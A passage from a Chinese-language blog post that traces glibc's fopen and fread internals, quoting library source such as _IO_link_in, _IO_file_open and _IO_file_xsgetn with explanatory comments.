class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *jmp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_old_init (fp, flags);</span><br><span class="line">  fp-&gt;_mode = orientation;</span><br><span class="line">  <span class="keyword">if</span> (orientation &gt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_wide_data = wd;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_buf_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_ptr = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_save_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_backup_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_save_end = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      fp-&gt;_wide_data-&gt;_wide_vtable = jmp;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="comment">/* Cause predictable crash when a wide function is called on a byte</span></span><br><span class="line"><span class="comment">       stream.  */</span></span><br><span class="line">    fp-&gt;_wide_data = (<span class="keyword">struct</span> _IO_wide_data *) <span class="number">-1L</span>;</span><br><span class="line">  fp-&gt;_freeres_list = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这个主要部分都被NULL掉了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_old_init (FILE *fp, <span class="type">int</span> flags)</span><br><span class="line">&#123;</span><br><span class="line">  fp-&gt;_flags = _IO_MAGIC|flags;</span><br><span class="line">  fp-&gt;_flags2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (stdio_needs_locking)</span><br><span class="line">    fp-&gt;_flags2 |= _IO_FLAGS2_NEED_LOCK;</span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_buf_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_read_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_read_ptr = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_read_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_write_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_write_ptr = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_write_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_chain = <span class="literal">NULL</span>; <span class="comment">/* Not necessary. */</span></span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_save_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_backup_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_save_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_markers = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_cur_column = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> _IO_JUMPS_OFFSET</span></span><br><span class="line">  fp-&gt;_vtable_offset = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_lock != <span class="literal">NULL</span>)</span><br><span class="line">    _IO_lock_init (*fp-&gt;_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282212549.png" alt="image-20240301235011497" style="zoom:50%;" /><p>这张图非常好的描述了初始化后的情况</p><h3 id="链接file部分"><a href="#链接file部分" class="headerlink" title="链接file部分"></a>链接file部分</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_new_file_init_internal (&amp;new_f-&gt;fp);                    <span class="comment">//third：将file链接到_IO_list_all</span></span><br></pre></td></tr></table></figure><p>跟进</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_new_file_init_internal (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* POSIX.1 allows another file handle to be used to change the position</span></span><br><span class="line"><span class="comment">     of our file descriptor.  Hence we actually don&#x27;t know the actual</span></span><br><span class="line"><span class="comment">     position before we do the first fseek (and until a following fflush). */</span></span><br><span class="line">  fp-&gt;file._offset = _IO_pos_BAD;</span><br><span class="line">  fp-&gt;file._flags |= CLOSED_FILEBUF_FLAGS;   </span><br><span class="line"></span><br><span class="line">  _IO_link_in (fp);</span><br><span class="line">  fp-&gt;file._fileno = <span class="number">-1</span>;   <span class="comment">//设置_fileno -1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要的作用是调用<code>_IO_link_in</code>和设置<code>_fileno</code>为-1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_link_in (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;file._flags &amp; _IO_LINKED) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;file._flags |= _IO_LINKED;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">..........</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      fp-&gt;file._chain = (FILE *) _IO_list_all;</span><br><span class="line">      _IO_list_all = fp;    <span class="comment">//通过_IO_list_all来赋值chain</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">..........</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_link_in)</span><br></pre></td></tr></table></figure><p>主要是通过<code>_IO_list_all</code>来赋值<code>chain</code>以此链接<code>file</code>链</p><h3 id="IO-file-fopen打开文件句柄部分"><a href="#IO-file-fopen打开文件句柄部分" class="headerlink" title="_IO_file_fopen打开文件句柄部分"></a>_IO_file_fopen打开文件句柄部分</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (_IO_file_fopen ((FILE *) new_f, filename, mode, is32) != <span class="literal">NULL</span>)</span><br><span class="line">  <span class="keyword">return</span> __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);</span><br><span class="line"></span><br><span class="line">_IO_un_link (&amp;new_f-&gt;fp);</span><br><span class="line"><span class="built_in">free</span> (new_f);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><p>先是调用<code>_IO_file_fopen</code>函数来打开文件，之后又再次调用<code>_IO_un_link</code>函数，之后free掉new_f？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">_IO_FILE *</span><br><span class="line">_IO_new_file_fopen (_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode,</span><br><span class="line">            <span class="type">int</span> is32not64)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">// 检查文件是否以打开，打开则返回</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_file_is_open (fp))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// 设置文件打开模式</span></span><br><span class="line">  <span class="keyword">switch</span> (*mode)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">      omode = O_RDONLY;</span><br><span class="line">      read_write = _IO_NO_WRITES;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">      ...    </span><br><span class="line">     &#125;</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">// 调用_IO_file_open函数</span></span><br><span class="line">  result = _IO_file_open (fp, filename, omode|oflags, oprot, read_write,</span><br><span class="line">              is32not64);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_fopen, _IO_file_fopen)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">FILE *</span><br><span class="line">_IO_file_open (FILE *fp, <span class="type">const</span> <span class="type">char</span> *filename, <span class="type">int</span> posix_mode, <span class="type">int</span> prot,</span><br><span class="line">       <span class="type">int</span> read_write, <span class="type">int</span> is32not64)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> fdesc;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL))</span><br><span class="line">    fdesc = __open_nocancel (filename,</span><br><span class="line">     posix_mode | (is32not64 ? <span class="number">0</span> : O_LARGEFILE), prot);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    fdesc = __open (filename, posix_mode | (is32not64 ? <span class="number">0</span> : O_LARGEFILE), prot);      <span class="comment">//系统调用open</span></span><br><span class="line">  <span class="keyword">if</span> (fdesc &lt; <span class="number">0</span>) </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_fileno = fdesc;            <span class="comment">//将文件描述符设置到fileno上</span></span><br><span class="line">  _IO_mask_flags (fp, read_write,_IO_NO_READS+_IO_NO_WRITES+_IO_IS_APPENDING);</span><br><span class="line">  <span class="comment">/* For append mode, send the file offset to the end of the file.  Don&#x27;t</span></span><br><span class="line"><span class="comment">     update the offset cache though, since the file handle is not active.  */</span></span><br><span class="line">  <span class="keyword">if</span> ((read_write &amp; (_IO_IS_APPENDING | _IO_NO_READS))</span><br><span class="line">      == (_IO_IS_APPENDING | _IO_NO_READS))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">off64_t</span> new_pos = _IO_SYSSEEK (fp, <span class="number">0</span>, _IO_seek_end);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD &amp;&amp; errno != ESPIPE)</span><br><span class="line">&#123;</span><br><span class="line">  __close_nocancel (fdesc);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  _IO_link_in ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);       <span class="comment">//再次执行_IO_link_in</span></span><br><span class="line">  <span class="keyword">return</span> fp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数的主要功能就是执行系统调用<code>open</code>打开文件，并将文件描述符赋值给FILE结构体的<code>_fileno</code>字段，最后再次调用<code>_IO_link_in</code>函数，确保该结构体被链接进入<code>_IO_list_all</code>链表。</p><p>执行完<code>_IO_new_file_fopen</code>函数后，FILE结构体为：</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282212550.png" alt="image-20240302003003453" style="zoom:50%;" /><p>该函数执行完后，程序返回FILE结构体指针</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>看完代码后，可以将fopen整体的流程可以归纳为：</p><ol><li><code>malloc</code>分配内存空间。</li><li><code>_IO_no_init</code> 对file结构体进行<code>null</code>初始化。</li><li><code>_IO_file_init</code>将结构体链接进<code>_IO_list_all</code>链表。</li><li><code>_IO_file_fopen</code>执行系统调用打开文件。</li></ol><p>整个流程还是比较简单的，fopen返回之后<code>_IO_list_all</code>链表指向返回的FILE结构体，且FILE结构体的_chain字段指向之前的结构体（没有其他额外打开文件的话，将是指向<code>stderr</code>），同时其他的字段大多都是默认的null值，<code>vtable</code>存储的是<code>__GI__IO_file_jumps</code>函数表</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282212551.png" alt="image-20240302003126840" style="zoom:50%;" /><h2 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h2><p>大致的流程如下</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282212552.png" alt="image-20240302135632361" style="zoom:50%;" /><h3 id="IO-fread"><a href="#IO-fread" class="headerlink" title="_IO_fread"></a>_IO_fread</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_fread (<span class="type">void</span> *buf, <span class="type">size_t</span> size, <span class="type">size_t</span> count, FILE *fp)   <span class="comment">//buf：缓冲区，fp：要读取的文件</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> bytes_requested = size * count;</span><br><span class="line">  <span class="type">size_t</span> bytes_read;</span><br><span class="line">  CHECK_FILE (fp, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (bytes_requested == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  bytes_read = _IO_sgetn (fp, (<span class="type">char</span> *) buf, bytes_requested);</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  <span class="keyword">return</span> bytes_requested == bytes_read ? count : bytes_read / size;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_fread)</span><br></pre></td></tr></table></figure><p>主要是调用<code>_IO_sgetn</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_sgetn (FILE *fp, <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* FIXME handle putback buffer here! */</span></span><br><span class="line">  <span class="keyword">return</span> _IO_XSGETN (fp, data, n);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_sgetn)</span><br></pre></td></tr></table></figure><p>而其中调用了<code>_IO_XSGETN</code>其中又<code>#define _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)</code>宏定义了为<code>_IO_file_xsgetn</code></p><h3 id="IO-file-xsgetn"><a href="#IO-file-xsgetn" class="headerlink" title="_IO_file_xsgetn"></a>_IO_file_xsgetn</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_file_xsgetn (FILE *fp, <span class="type">void</span> *data, <span class="type">size_t</span> n)<span class="comment">/*fp：指向要读取数据的文件流的指针。data：指向用户缓冲区的指针。n：要读取的数据的数量。*/</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> want, have;</span><br><span class="line">  <span class="type">ssize_t</span> count;</span><br><span class="line">  <span class="type">char</span> *s = data;       <span class="comment">//s是用户缓冲区</span></span><br><span class="line"></span><br><span class="line">  want = n;         <span class="comment">//want是要存储数据的数量</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">&#125;</span><br><span class="line">      _IO_doallocbuf (fp);      <span class="comment">//first：如果未创建缓冲区则调用_IO_doallocbuf创建</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (want &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;   <span class="comment">//输入缓冲区的数据</span></span><br><span class="line">      <span class="keyword">if</span> (want &lt;= have)       </span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, want);      <span class="comment">//second：如果输入缓冲区有data，则拷贝输入缓冲区</span></span><br><span class="line">  fp-&gt;_IO_read_ptr += want;          </span><br><span class="line">  want = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span>          <span class="comment">//third：如果输入缓冲区为0或不满足需求</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (have &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);    <span class="comment">//先将能拷贝的拷贝到用户缓冲区</span></span><br><span class="line">      want -= have;</span><br><span class="line">      fp-&gt;_IO_read_ptr += have;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Check for backup and repeat */</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))              <span class="comment">//_IO_IN_BACKUP 标志位用于指示文件流是否有一个输入缓冲区的备份</span></span><br><span class="line">    &#123;</span><br><span class="line">      _IO_switch_to_main_get_area (fp);   <span class="comment">//切换文件流的输入缓冲区为主要区域</span></span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If we now want less than a buffer, underflow and repeat</span></span><br><span class="line"><span class="comment">     the copy.  Otherwise, _IO_SYSREAD directly to</span></span><br><span class="line"><span class="comment">     the user buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base</span><br><span class="line">      &amp;&amp; want &lt; (<span class="type">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (__underflow (fp) == EOF)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* These must be set before the sysread as we might longjmp out</span></span><br><span class="line"><span class="comment">     waiting for input. */</span></span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  _IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Try to maintain alignment: read a whole number of blocks.  */</span></span><br><span class="line">  count = want;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> block_size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base;</span><br><span class="line">      <span class="keyword">if</span> (block_size &gt;= <span class="number">128</span>)</span><br><span class="line">count -= want % block_size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  count = _IO_SYSREAD (fp, s, count);</span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  s += count;</span><br><span class="line">  want -= count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> n - want;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_file_xsgetn)</span><br></pre></td></tr></table></figure><p>该file虚表函数分为三个部分：</p><ul><li>首先是判断是否存在输入缓冲区，如果没有则调用<code>_IO_doallocbuf</code>来初始化输入缓冲区；</li><li>然后再判断输入缓冲区是否有足够的数据空间，如果有则直接拷贝到用户缓冲区；</li><li>如果没有则调用<code>__underflow</code>扩大输入缓冲区，再拷贝至用户缓冲区</li></ul><h3 id="初始化部分-1"><a href="#初始化部分-1" class="headerlink" title="初始化部分"></a>初始化部分</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="type">size_t</span> want, have;</span><br><span class="line"> <span class="type">ssize_t</span> count;</span><br><span class="line"> <span class="type">char</span> *s = data;       <span class="comment">//s是用户缓冲区</span></span><br><span class="line"></span><br><span class="line"> want = n;         <span class="comment">//want是要存储数据的数量</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">     <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">&#125;</span><br><span class="line">     _IO_doallocbuf (fp);      <span class="comment">//first：如果未创建缓冲区则调用_IO_doallocbuf创建</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>首先会判断是否存在reserve area即<code>fp-&gt;_IO_buf_base == NULL</code>，如果为空的话，就说明resever area还没有被分配出来，则会调用<code>_IO_doallocbuf</code>分配一个reserve area</p><h3 id="分配reserve-area"><a href="#分配reserve-area" class="headerlink" title="分配reserve area"></a>分配reserve area</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_doallocbuf (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED) || fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> (_IO_DOALLOCATE (fp) != EOF)</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  _IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_doallocbuf)</span><br></pre></td></tr></table></figure><p>其中又调用了系统调用<code>_IO_DOALLOCATE</code>，其中调用了<code>IO_file_doallocate</code>，又调用了vtable中的<code>_IO_file_stat</code>函数，而后又执行了系统调用<code>fstat</code>，这个系统调用是来获取文件状态，并且初始化st结构体的。可以看到此时的st_blksize为4096，而这个st_blksize也就是接下来malloc申请的内存大小（也就是reserve 